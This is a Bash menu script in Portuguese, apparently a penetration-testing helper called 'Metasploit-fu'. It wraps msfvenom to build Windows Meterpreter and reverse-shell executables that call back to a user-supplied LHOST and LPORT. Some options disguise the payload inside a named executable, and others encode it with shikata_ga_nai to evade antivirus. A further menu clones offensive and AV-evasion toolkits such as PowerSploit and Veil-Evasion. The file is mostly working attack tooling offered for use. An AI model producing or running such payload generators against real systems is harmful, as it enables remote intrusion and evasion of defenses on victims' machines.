#!/bin/bash
echo "Bem vindo ao Metasploit-fu (Windows)"
echo "Criado por Joas Antonio"
echo "Versao 1.0 - Beta"
echo ""
echo "1 - Gerar payloads simples"
echo "2 - Gerar payloads encodados"
echo "3 - Scripts de terceiros"
echo ""
read -p "Digite a opcao desejada: " option
echo ""
if [ $option -eq 1 ];
then
	echo "Gerar payloads simples com MSFVENOM"
	echo ""
	echo "1 - Meterpreter x64"
	echo "2 - Meterpreter x86"
	echo "3 - Shell x64"
	echo "4 - Shell x86"
	echo ""
	read -p "Digite a arquitetura que voce deseja gerar: " arch
	echo ""
	if [ $arch -eq 1 ];
	then
		echo "Meterpreter x64"
		echo ""
		read -p "Digite o LHOST: " lhost
		read -p "Digite a LPORT: " lport
		read -p "Digite nome do executavel.exe: " exe
		echo ""
		msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$lhost lport=$lport -x $exe -f exe > $exe 
		echo ""
		echo "Payload gerado"
	elif [ $arch -eq 2 ]
	then
		echo "Meterpreter X86"
		echo ""
		read -p "Digite o LHOST: " lhost2
		read -p "Digite a LPORT: " lport2
		read -p "Digite nome do executavel.exe: " exe2
		echo ""
		msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost2 lport=$lport2  -x $exe2 -f exe > $exe2
		echo ""
		echo "Payload Gerado"
	elif [ $arch -eq 3 ]
	then
		echo "Shell X64"
		echo ""
		read -p "Digite o LHOST: " lhost3
		read -p "Digite o LPORT: " lport3
		read -p "Digite nome do executavel.exe: " exe3
		echo ""
		msfvenom -p windows/x64/shell_reverse_tcp lhost=$lhost3 lport=$lport3 -x $exe3 -f exe > $exe3
		echo ""
		echo "Payload Gerado"
	elif [ $arch -eq 4 ]
	then
		echo "Shell x86"
		echo ""
		read -p "Digite o LHOST: " lhost4
		read -p "Digite o LPORT: " lport4
		read -p "DIgite o nome do executavel.exe: " exe4
		echo ""
		msfvenom -p windows/shell_reverse_tcp lhost=$lhost4 lport=$lport4 -x $exe4 -f exe > $exe4
		echo ""
		echo "Payload Gerado"
	else
		echo "Finish"
	fi
elif [ $option -eq 2 ];
then
	echo "Gerar payloads encodados"
	echo "1 - Meterpreter X64"
	echo "2 - Meterpreter X86"
	echo ""
	read -p "Digite a arquitetura que voce deseja gerar: " arch2
	echo ""
	if [ $arch2 -eq 1 ]
	then
		echo "Meterpreter X64"
		echo ""
		read -p "Digite o LHOST: " lhost5
		read -p "Digite o LPORT: " lport5
		read -p "Digite o nome do executavel.exe: " exe5
		read -p "Digite o numero de embaralhamento: " emb
		echo ""
		msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$lhost5 lport=$lport5 -e x86/shikata_ga_nai -i $emb -f exe -o $exe5
		echo ""
		echo "Payload gerado"	
	elif [ $arch2 -eq 2 ]
	then
		echo "Meterpreter X86"
		echo ""
		read -p "Digite o LHOST: " lhost6
		read -p "Digite o LPORT: " lport6
		read -p "Digite o nome do executavel.exe: " exe6
		read -p "Digite o numero de embaralhamento: " emb2
		echo ""
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost6 lport=$lport6 -e x86/shikata_ga_nai -i $emb2 -f exe -o $exe6
		echo ""
		echo "Payload gerado"
	else
		echo "Finish"
	fi
elif [ $option -eq 3 ];
then
	echo "Scripts de terceiros - Github"
	echo "1 - https://github.com/PowerShellMafia/PowerSploit"
	echo "2 - https://github.com/govolution/avet"
	echo "3 - https://github.com/Veil-Framework/Veil-Evasion"
	echo "4 - https://github.com/trustedsec/unicorn"
	echo "5 - https://github.com/hegusung/AVSignSeek"
	echo "6 - https://github.com/tokyoneon/Armor"
	echo "7 - https://github.com/nccgroup/metasploitavevasion"
	echo "8 - https://github.com/govolution/avepoc"
	read -p "Digite um dos scripts que quer utilizar: " select2
	echo ""
	if [ $select2 -eq 1 ]
	then
		echo "PowerSploit"
		git clone https://github.com/PowerShellMafia/PowerSploit && mv PowerSploit/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 2 ]
	then
		echo "Avet"
		git clone https://github.com/govolution/avet && mv avet/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 3 ]
	then
		echo "Veil-Evasion"
		git clone https://github.com/Veil-Framework/Veil-Evasion && mv Veil-Evasion/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 4 ]
	then	
		echo "Unicorn"
		git clone https://github.com/trustedsec/unicorn && mv unicorn/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 5 ]
	then
		echo "AVSignSeek"
		git clone https://github.com/hegusung/AVSignSeek && mv AVSignSeek/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 6 ]
	then
		echo "Armor"
		git clone https://github.com/tokyoneon/Armor && mv Armor/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 7 ]
	then	
		echo "Metasploitavevasion"
		git clone https://github.com/nccgroup/metasploitavevasion && mv metasploitavevasion/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	elif [ $select2 -eq 8 ]
	then
		echo "Govolution"
		git clone https://github.com/govolution/avepoc && mv govolution/ scripts/
		echo ""
		echo "Download concluido! Acesse o diretorio script"
	else
		echo "Finish"
	fi
fi
